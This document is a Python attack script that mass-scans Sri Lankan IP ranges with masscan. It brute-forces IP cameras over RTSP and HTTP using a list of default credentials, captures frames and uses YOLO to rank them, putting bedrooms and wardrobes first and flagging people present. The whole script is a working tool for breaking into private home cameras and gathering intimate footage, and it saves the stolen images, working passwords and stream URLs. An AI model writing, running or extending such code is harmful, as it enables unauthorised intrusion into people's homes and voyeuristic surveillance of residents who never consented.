#!/usr/bin/env python3
"""
TITAN-X Sri Lanka Bedroom/Wardrobe Priority Hunter v2
FAST: RTSP-only probe on camera IPs, then HTTP snapshot on port-80/8000 IPs.
Validates with OpenCV, classifies with YOLO — PRIORITY: bedrooms & wardrobes.
"""
import subprocess, os, json, sys, time, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

WORK_DIR = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FRAME_DIR = os.path.join(WORK_DIR, 'lk_frames')
SCENE_DIR = os.path.join(WORK_DIR, 'lk_bedrooms')
os.makedirs(FRAME_DIR, exist_ok=True)
os.makedirs(SCENE_DIR, exist_ok=True)

CREDS = [
    ('admin', '12345'), ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
    ('admin', '123456'), ('admin', '1111'), ('admin', '888888'), ('admin', '666666'),
    ('root', ''), ('root', 'pass'), ('root', '1234'), ('root', 'root'),
    ('root', 'vizxv'), ('root', 'xc3511'), ('supervisor', 'supervisor'),
    ('ubnt', 'ubnt'), ('admin', 'password'), ('admin', 'admin123'),
]

RTSP_PATHS = [
    '/Streaming/Channels/101', '/Streaming/Channels/1',
    '/h264/ch1/main/av_stream', '/cam/realmonitor?channel=1&subtype=0',
    '/stream1', '/live/ch00_0', '/onvif1', '/11',
]

# HTTP snapshot — only top paths × only matching port
HTTP_SNAPS = [
    '/ISAPI/Streaming/channels/101/picture',
    '/cgi-bin/snapshot.cgi?channel=1',
    '/snap.jpg', '/snapshot.jpg',
    '/webcapture.jpg?command=snap&channel=1',
    '/onvif-http/snapshot?Profile_1',
    '/Streaming/channels/1/picture',
    '/cgi-bin/images_cgi?channel=0',
]

SRI_LANKA_CIDRS = [
    '112.134.0.0/15', '220.247.0.0/17', '203.143.0.0/17', '203.115.0.0/17',
    '124.43.0.0/16', '175.157.0.0/16', '192.248.0.0/16', '103.0.0.0/16',
    '116.206.0.0/15', '43.224.0.0/14', '103.21.0.0/16', '103.24.0.0/14',
    '202.21.0.0/16', '202.69.0.0/16', '61.245.160.0/19', '122.255.0.0/16',
    '180.232.0.0/14', '110.12.0.0/15', '117.247.0.0/16', '123.231.0.0/16',
    '150.129.0.0/16', '163.32.0.0/16',
]

PRIORITY_SCENES = {'bedroom', 'wardrobe'}
INDOOR_SCENES = {'bedroom', 'wardrobe', 'dining_room', 'kitchen', 'living_room', 'office', 'bathroom', 'indoor'}
SCENE_MAP = {
    'bed': 'bedroom', 'teddy bear': 'bedroom', 'hair drier': 'bedroom',
    'suitcase': 'wardrobe', 'handbag': 'wardrobe', 'backpack': 'wardrobe', 'tie': 'wardrobe',
    'refrigerator': 'kitchen', 'oven': 'kitchen', 'microwave': 'kitchen', 'sink': 'kitchen', 'toaster': 'kitchen',
    'sofa': 'living_room', 'couch': 'living_room', 'tv': 'living_room', 'remote': 'living_room', 'vase': 'living_room',
    'dining table': 'dining_room', 'bowl': 'dining_room', 'cup': 'dining_room',
    'wine glass': 'dining_room', 'fork': 'dining_room', 'spoon': 'dining_room', 'bottle': 'dining_room',
    'laptop': 'office', 'keyboard': 'office', 'mouse': 'office', 'book': 'office', 'clock': 'office',
    'toilet': 'bathroom', 'toothbrush': 'bathroom',
    'chair': 'indoor', 'potted plant': 'indoor', 'cell phone': 'indoor',
    'car': 'outside', 'truck': 'outside', 'bus': 'outside', 'bicycle': 'outside',
    'motorcycle': 'outside', 'traffic light': 'outside', 'stop sign': 'outside',
    'person': 'has_person',
}

streams_found = []
stats = {'rtsp': 0, 'http': 0, 'bedroom': 0, 'wardrobe': 0, 'indoor': 0}
yolo_model = None


def valid_frame(path):
    """Check if file is a real camera JPEG"""
    try:
        if not os.path.exists(path) or os.path.getsize(path) < 2000:
            return False
        with open(path, 'rb') as f:
            h = f.read(2)
            if h != b'\xff\xd8':
                return False
        import cv2
        img = cv2.imread(path)
        if img is None:
            return False
        return img.shape[0] >= 120 and img.shape[1] >= 160
    except:
        return False


def probe_rtsp(ip):
    """RTSP probe — fast, 3s timeout per attempt, top creds first"""
    frame = os.path.join(FRAME_DIR, f'{ip.replace(".", "_")}.jpg')
    for user, passwd in CREDS:
        for rpath in RTSP_PATHS:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            url = f'rtsp://{auth}{ip}:554{rpath}'
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=3, text=True
                )
                if r.returncode == 0 and valid_frame(frame):
                    return {'ip': ip, 'type': 'rtsp', 'user': user, 'pass': passwd,
                            'url': url, 'frame': frame, 'sz': os.path.getsize(frame)}
            except:
                pass
    # Cleanup failed
    try:
        if os.path.exists(frame) and not valid_frame(frame):
            os.remove(frame)
    except:
        pass
    return None


def probe_http(ip, ports):
    """HTTP snapshot probe — try detected open ports only"""
    import base64
    frame = os.path.join(FRAME_DIR, f'{ip.replace(".", "_")}.jpg')
    from urllib.request import urlopen, Request
    
    for user, passwd in CREDS[:10]:
        auth_b64 = base64.b64encode(f'{user}:{passwd}'.encode()).decode()
        for port in ports:
            scheme = 'https' if port == 443 else 'http'
            for spath in HTTP_SNAPS:
                url = f'{scheme}://{ip}:{port}{spath}'
                try:
                    req = Request(url, headers={
                        'Authorization': f'Basic {auth_b64}',
                        'User-Agent': 'Mozilla/5.0'
                    })
                    resp = urlopen(req, timeout=3)
                    ct = resp.headers.get('Content-Type', '')
                    data = resp.read(5_000_000)
                    if len(data) > 2000:
                        with open(frame, 'wb') as f:
                            f.write(data)
                        if valid_frame(frame):
                            return {'ip': ip, 'type': 'http', 'user': user, 'pass': passwd,
                                    'url': url, 'frame': frame, 'sz': os.path.getsize(frame)}
                        try: os.remove(frame)
                        except: pass
                except:
                    pass
    return None


def classify(frame_path):
    """YOLO classify — returns scene dict"""
    global yolo_model
    if not yolo_model:
        return None
    try:
        results = yolo_model(frame_path, conf=0.12, verbose=False)
        dets = []
        votes = {}
        has_person = False
        for r in results:
            for box in r.boxes:
                cls = r.names[int(box.cls)]
                conf = float(box.conf)
                dets.append((cls, conf))
                if cls == 'person':
                    has_person = True
                    continue
                scene = SCENE_MAP.get(cls)
                if scene and scene not in ('outside', 'has_person'):
                    boost = 1.5 if scene == 'bedroom' else (1.3 if scene == 'wardrobe' else 1.0)
                    votes[scene] = votes.get(scene, 0) + conf * boost
        best = max(votes, key=votes.get) if votes else 'unclassified'
        conf = votes.get(best, 0)
        return {'scene': best, 'conf': round(conf, 3), 'objects': dets, 'person': has_person, 'votes': votes}
    except:
        return None


def on_stream(result):
    """Called when a stream is found — classify + report immediately"""
    s = result
    streams_found.append(s)
    n = len(streams_found)
    
    cls = classify(s['frame'])
    s['cls'] = cls or {'scene': 'unknown', 'conf': 0, 'objects': [], 'person': False}
    scene = s['cls']['scene']
    objs = ', '.join(f'{o}({c:.0%})' for o, c in s['cls'].get('objects', [])[:5])
    person = ' [PERSON]' if s['cls'].get('person') else ''
    
    is_priority = scene in PRIORITY_SCENES
    is_indoor = scene in INDOOR_SCENES
    
    if is_priority:
        stats['bedroom' if scene == 'bedroom' else 'wardrobe'] += 1
        stats['indoor'] += 1
        tag = f' ★★★ {scene.upper()} ★★★'
        dst = os.path.join(SCENE_DIR, f'LK_{scene}_{s["ip"].replace(".", "_")}.jpg')
        shutil.copy2(s['frame'], dst)
        s['save'] = dst
    elif is_indoor:
        stats['indoor'] += 1
        tag = f' ◆ {scene}'
        dst = os.path.join(SCENE_DIR, f'LK_{scene}_{s["ip"].replace(".", "_")}.jpg')
        shutil.copy2(s['frame'], dst)
    else:
        tag = f' ({scene})'
    
    print(f'  ✓ #{n:>3} {s["ip"]:>16} | {s["type"]:>4} | {s["user"]}:{s["pass"]:>8} | {s["sz"]:>8,}B{tag}{person}', flush=True)
    if objs:
        print(f'         Objects: {objs}', flush=True)


def main():
    global yolo_model
    t0 = time.time()
    
    print(f'{"="*80}', flush=True)
    print(f'  TITAN-X SRI LANKA — BEDROOM & WARDROBE PRIORITY v2', flush=True)
    print(f'  {len(CREDS)} creds × {len(RTSP_PATHS)} RTSP + {len(HTTP_SNAPS)} HTTP', flush=True)
    print(f'  Split: FAST RTSP on camera IPs → HTTP on web IPs', flush=True)
    print(f'  {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', flush=True)
    print(f'{"="*80}\n', flush=True)
    
    # Load YOLO
    try:
        from ultralytics import YOLO
        mp = os.path.join(WORK_DIR, 'yolo11n.pt')
        yolo_model = YOLO(mp if os.path.exists(mp) else 'yolov8n.pt')
        print(f'[+] YOLO loaded\n', flush=True)
    except Exception as e:
        print(f'[!] YOLO failed: {e}\n', flush=True)

    # ═══ PHASE 1: MASSCAN ═══
    print(f'[PHASE 1] MASSCAN — Sri Lanka full IP space', flush=True)
    cidr = '/tmp/lk_bed_cidr.txt'
    mres = '/tmp/lk_bed_masscan.txt'
    with open(cidr, 'w') as f:
        f.write('\n'.join(SRI_LANKA_CIDRS))
    
    subprocess.run(['masscan', '-iL', cidr, '-p', '554,8000,80,443,8200',
                     '--rate', '500000', '--open-only', '-oG', mres,
                     '--exclude', '255.255.255.255'],
                    capture_output=True, timeout=300, text=True)
    
    ips_ports = {}
    if os.path.exists(mres):
        with open(mres) as f:
            for line in f:
                if line.startswith('#'): continue
                parts = line.split()
                ip = port = None
                for i, p in enumerate(parts):
                    if p == 'Host:' and i+1 < len(parts): ip = parts[i+1]
                    if 'Ports:' in p and i+1 < len(parts): port = parts[i+1].split('/')[0]
                if ip and port:
                    ips_ports.setdefault(ip, set()).add(port)
    
    # Split: camera IPs (554 or 8000) vs HTTP-only (80/443/8200)
    rtsp_ips = [ip for ip, p in ips_ports.items() if '554' in p]
    hik_ips = [ip for ip, p in ips_ports.items() if '8000' in p and '554' not in p]
    http_ips = [(ip, [int(x) for x in p if x in ('80','443','8200')]) 
                for ip, p in ips_ports.items() 
                if '554' not in p and '8000' not in p and ('80' in p or '443' in p or '8200' in p)]
    # hik IPs also get HTTP probe on port 8000
    hik_http = [(ip, [8000]) for ip in hik_ips]
    
    total = len(ips_ports)
    print(f'  {total:,} hosts | {len(rtsp_ips)} RTSP(554) | {len(hik_ips)} Hik(8000) | {len(http_ips)} HTTP-only', flush=True)

    # ═══ PHASE 2A: FAST RTSP PROBE ═══
    all_rtsp = list(set(rtsp_ips + hik_ips))  # Hik IPs often have RTSP too
    print(f'\n[PHASE 2A] RTSP PROBE — {len(all_rtsp)} camera IPs | 200 workers', flush=True)
    done = 0
    t_rtsp = time.time()
    
    with ThreadPoolExecutor(max_workers=200) as pool:
        futs = {pool.submit(probe_rtsp, ip): ip for ip in all_rtsp}
        for fut in as_completed(futs):
            done += 1
            try:
                r = fut.result()
                if r:
                    stats['rtsp'] += 1
                    on_stream(r)
            except:
                pass
            if done % 1000 == 0:
                el = time.time() - t_rtsp
                rate = done / max(el, 1)
                eta = (len(all_rtsp) - done) / max(rate, 0.1)
                print(f'  [{done}/{len(all_rtsp)}] {el:.0f}s | {len(streams_found)} found | {rate:.0f}/s | ETA {eta:.0f}s | BR={stats["bedroom"]} WR={stats["wardrobe"]}', flush=True)
    
    el_rtsp = time.time() - t_rtsp
    print(f'  RTSP done: {stats["rtsp"]} streams from {len(all_rtsp)} IPs in {el_rtsp:.0f}s\n', flush=True)

    # ═══ PHASE 2B: HTTP SNAPSHOT PROBE ═══
    # Probe Hik IPs on port 8000 + HTTP-only IPs on their detected ports
    all_http = hik_http + http_ips
    # Skip IPs already found via RTSP
    found_ips = {s['ip'] for s in streams_found}
    all_http = [(ip, ports) for ip, ports in all_http if ip not in found_ips]
    
    print(f'[PHASE 2B] HTTP SNAPSHOT — {len(all_http)} IPs | 200 workers', flush=True)
    done = 0
    t_http = time.time()
    
    with ThreadPoolExecutor(max_workers=200) as pool:
        futs = {pool.submit(probe_http, ip, ports): ip for ip, ports in all_http}
        for fut in as_completed(futs):
            done += 1
            try:
                r = fut.result()
                if r:
                    stats['http'] += 1
                    on_stream(r)
            except:
                pass
            if done % 2000 == 0:
                el = time.time() - t_http
                rate = done / max(el, 1)
                eta = (len(all_http) - done) / max(rate, 0.1)
                print(f'  [{done}/{len(all_http)}] {el:.0f}s | {len(streams_found)} total | {rate:.0f}/s | ETA {eta:.0f}s | BR={stats["bedroom"]} WR={stats["wardrobe"]}', flush=True)
    
    el_http = time.time() - t_http
    print(f'  HTTP done: {stats["http"]} snapshots from {len(all_http)} IPs in {el_http:.0f}s\n', flush=True)

    # ═══ FINAL REPORT ═══
    el_total = time.time() - t0
    print(f'\n{"="*80}', flush=True)
    print(f'  SRI LANKA BEDROOM/WARDROBE HUNT COMPLETE', flush=True)
    print(f'  {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} | {el_total:.0f}s', flush=True)
    print(f'{"="*80}', flush=True)
    print(f'  Masscan hosts:   {total:,}', flush=True)
    print(f'  RTSP probed:     {len(all_rtsp):,} → {stats["rtsp"]} streams', flush=True)
    print(f'  HTTP probed:     {len(all_http):,} → {stats["http"]} snapshots', flush=True)
    print(f'  Total live:      {len(streams_found)}', flush=True)
    print(f'  ─────────────────────────────', flush=True)
    print(f'  ★ BEDROOMS:      {stats["bedroom"]}', flush=True)
    print(f'  ★ WARDROBES:     {stats["wardrobe"]}', flush=True)
    print(f'  ◆ Indoor total:  {stats["indoor"]}', flush=True)
    
    # Scene breakdown
    sc_cnt = {}
    for s in streams_found:
        sc = s.get('cls', {}).get('scene', '?')
        sc_cnt[sc] = sc_cnt.get(sc, 0) + 1
    if sc_cnt:
        print(f'\n  Scene Breakdown:', flush=True)
        for sc, cnt in sorted(sc_cnt.items(), key=lambda x: -x[1]):
            m = ' ★★★' if sc in PRIORITY_SCENES else (' ◆' if sc in INDOOR_SCENES else '')
            print(f'    {sc:>16}: {cnt}{m}', flush=True)
    
    # Indoor cameras detail
    indoor = [s for s in streams_found if s.get('cls', {}).get('scene', '') in INDOOR_SCENES]
    if indoor:
        print(f'\n  ═══ INDOOR CAMERAS ({len(indoor)}) ═══', flush=True)
        for i, s in enumerate(indoor, 1):
            c = s.get('cls', {})
            pr = '★★★' if c.get('scene') in PRIORITY_SCENES else '◆'
            objs = ', '.join(o for o, _ in c.get('objects', [])[:5])
            p = ' [PERSON]' if c.get('person') else ''
            print(f'  {pr} {i}. {s["ip"]:>16} | {c.get("scene","?"):>12} ({c.get("conf",0):.2f}) | {s["type"]} {s["user"]}:{s["pass"]}{p}', flush=True)
            print(f'       URL: {s["url"]}', flush=True)
            if objs:
                print(f'       Objects: {objs}', flush=True)
    
    # ALL streams
    print(f'\n  ═══ ALL STREAMS ({len(streams_found)}) ═══', flush=True)
    for i, s in enumerate(streams_found, 1):
        c = s.get('cls', {})
        sc = c.get('scene', '?')
        tag = '★' if sc in PRIORITY_SCENES else ('◆' if sc in INDOOR_SCENES else ' ')
        p = ' [P]' if c.get('person') else ''
        print(f'  {tag} {i:>3}. {s["ip"]:>16} | {sc:>12} | {s["type"]:>4} | {s["user"]}:{s["pass"]}{p}', flush=True)
    
    # Save JSON
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = os.path.join(WORK_DIR, f'lk_bedroom_{ts}.json')
    with open(out, 'w') as f:
        json.dump({
            'country': 'LK', 'priority': ['bedroom', 'wardrobe'], 'ts': ts,
            'stats': {**stats, 'total_hosts': total, 'rtsp_probed': len(all_rtsp), 'http_probed': len(all_http)},
            'streams': [{k: v for k, v in s.items() if k != 'frame'} for s in streams_found]
        }, f, indent=2, default=str)
    print(f'\n  [+] Saved: {out}', flush=True)
    
    bedroom_files = [s.get('save') for s in streams_found if s.get('save')]
    if bedroom_files:
        print(f'\n  ★★★ PRIORITY FILES ★★★', flush=True)
        for bf in bedroom_files:
            print(f'    {bf}', flush=True)
    
    print(f'\n  *** COMPLETE ***', flush=True)


if __name__ == '__main__':
    main()
